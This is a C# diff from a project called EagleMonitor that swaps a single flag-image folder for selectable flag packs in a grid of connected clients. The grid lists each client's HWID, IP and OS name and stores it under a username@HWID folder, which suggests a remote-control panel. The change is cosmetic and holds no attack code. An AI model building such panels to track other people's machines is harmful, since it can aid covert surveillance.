@@ -35,7 +35,6 @@ namespace EagleMonitor.PacketParser
                     }
                 }
 
-
                 if (!Directory.Exists(Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID))
                 {
                     Directory.CreateDirectory(Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID);
@@ -54,10 +53,38 @@ namespace EagleMonitor.PacketParser
                     int rowId = Program.mainForm.dataGridView1.Rows.Add();
 
                     DataGridViewRow row = Program.mainForm.dataGridView1.Rows[rowId];
-                    if (File.Exists(Miscellaneous.GPath + "\\Flags\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
-                        row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
-                    else
-                        row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\" + "UKN" + ".png"), new Size(26, 26));
+
+                    switch (Miscellaneous.settings.flagsPackName) 
+                    {
+                        case "FlagsBase":
+                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
+                            else
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
+                            break;
+
+                        case "FlagsPack1":
+                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsPack1\\" + connectedPacket.RegionFlag.ToLower() + ".ico"))
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsPack1\\" + connectedPacket.RegionFlag.ToLower() + ".ico"), new Size(26, 26));
+                            else
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
+                            break;
+
+                        case "FlagsPack2":
+                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsPack2\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsPack2\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
+                            else
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
+                            break;
+
+                        case "FlagsPack3":
+                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsPack3\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsPack3\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
+                            else
+                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
+                            break;
+                    }
+                
                     row.Cells["Column2"].Value = connectedPacket.HWID;
                     row.Cells["Column3"].Value = clientHandler.IP;
                     row.Cells["Column4"].Value = connectedPacket.OSName;
